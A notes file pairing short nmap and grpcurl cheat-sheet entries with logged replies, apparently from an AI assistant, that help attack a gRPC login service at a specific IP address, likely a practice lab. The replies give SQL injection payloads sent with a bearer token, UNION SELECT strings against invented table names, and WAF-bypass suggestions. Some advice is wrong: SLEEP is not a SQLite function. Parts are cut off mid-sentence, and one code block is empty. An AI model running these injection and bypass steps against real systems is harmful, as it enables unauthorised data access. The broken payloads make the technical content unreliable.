# nmap
Nmap is a free and open source utility for network discovery and security auditing.

1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
   ```
   nmap -A <target-ip>
   ```

2. **OS Detection**:
   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
   ```
   nmap -O <target-ip>
   ```

3. **Skip Host Discovery**:
   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
   ```
   nmap -Pn <target-ip>
   ```

4. **TCP SYN Scan**:
   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
   ```
   nmap -sS <target-ip>
   ```

5. **TCP Connect Scan**:
   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
   ```
   nmap -sT <target-ip>
   ```

6. **UDP Scan**:
   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
   ```
   nmap -sU <target-ip>
   ```

7. **TCP NULL Scan**:
   - This scan sends T

# grpcurl
grpcurl is a command-line tool that lets you interact with gRPC servers. It's basically curl for gRPC servers.
Common ports for gRPC services include 50051

## Example commands:
### grpcurl -plaintext -vv <ip:port> list
	Use this for initial scan of the gRPC API.
	Outputs a list of available services at the given address:port.
	-plaintext flag says to not use TLS when connecting.

### grpcurl -plaintext -vv <ip:port> list <Service>
	Use this to gather information about a service provided by the gRPC API.
	Outputs a list of available methods for the given service.
	-plaintext flag says to not use TSL when connecting.

### grpcurl -plaintext -vv <ip:port> describe <Service>
	Outputs the available methods for the given service with each methods input parameters and expected output.
	-plaintext flag says to not use TSL when connecting.

### grpcurl -plaintext -vv -format text -d '<input string>' <ip:port> <Service.Method>
	Submits data to the given service.method endpoint.
	-plaintext flag says to not use TSL when connecting.
	-format text flag tells the given input data is in a text format.
	-d '<input string>' flag tells what data to submit.


--------------------------------------------------------------------------
user_prompt: Discuss | Can you give me some commands to run on the login method?
response:  To interact with the SimpleApp service's LoginUser method, you can use the following grpcurl command:

```
grpcurl -plaintext -vv 10.10.11.214:50051 SimpleApp.LoginUser
```

This command connects to the SimpleApp service on port 50051 at the IP address 10.10.11.214 and interacts with the LoginUser method.

To submit a login request, you can use the following command:

```
grpcurl -plaintext -vv -format text -d '{ "Username": "testuser", "Password": "testpassword" }' 10.10.11.214:50051 SimpleApp.LoginUser
```

This command submits a login request with the username "testuser" and the password "testpassword" to the SimpleApp service's LoginUser method.

To test the RegisterUser method, you can use the following command:

```

--------------------------------------------------------------------------
user_prompt: Discuss | None of these worked, is there any sqlite specific tables we can target?
response:  To target specific SQLite tables in the SimpleApp service, you can try the following steps:

1. Identify the method that takes the id input, in this case, it is the getInfo method.
2. Create a list of potential SQLite injection payloads to test, such as single quotes ('), double quotes (""), and SQL keywords like AND, OR, and UNION.
3. Modify the input data in the command by appending the payloads to the id input:

```
grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdHVzZXIiLCJleHAiOjE3MTUwMjg0NjV9.4q25-fshz4uwCEIyel-_l8AwJIYjgwrK8NjqaziMSV8' -d 'id: "26" OR 1=1' 10.10.11.214:50051 SimpleApp.getInfo
```

4. Send the modified command and observe the response. If the response contains sensitive information or an error message that indicates the SQLite injection was successful, the service is vulnerable.
5. Repeat the process with other payloads and input data to determine the extent of the vulnerability.

- Table1 payload:
```
-d 'id: "26" OR 1=1 UNION SELECT * FROM Table1 WHERE 1'
```

- Table2 payload:
```
-d 'id: "26" OR 1=1 UNION SELECT * FROM Table2 WHERE 1'
```

- Table3 payload:
```
-d 'id: "26" OR 1=1 UNION SELECT * FROM Table3 WHERE 1'
```

By using these payloads, you can attempt to target specific SQLite tables in the SimpleApp service.



--------------------------------------------------------------------------
user_prompt: Discuss | None of these payloads works
response:  If the payloads mentioned above are not working, it is possible that the SimpleApp service has implemented additional security measures, such as input validation or WAF (Web Application Firewall) rules, to prevent SQL injection attacks.

To bypass these security measures, you can try the following steps:

1. Research common bypass techniques for input validation and WAF rules, such as using multi-stage attacks, error-based SQL injection, or time-based blind SQL injection.
2. Modify the payloads to incorporate these bypass techniques.
3. Test the modified payloads to see if they are successful in extracting user credentials or accessing specific SQLite tables.

For example, you can try using a time-based blind SQL injection technique by adding a delay to the payload:

- Time-based blind SQL injection payload:
```
-d 'id: "26" OR 1=1 AND SLEEP(5) OR 1=1'
```

This payload adds a 5-second delay before the query is executed, which can be used to identify the presence of SQL injection vulnerabilities.

Remember to be cautious when attempting to exploit vulnerabilities, as it may lead to unauthorized access or data breaches. Always have a responsible disclosure process in place and coordinate with the service owner before taking any further action.
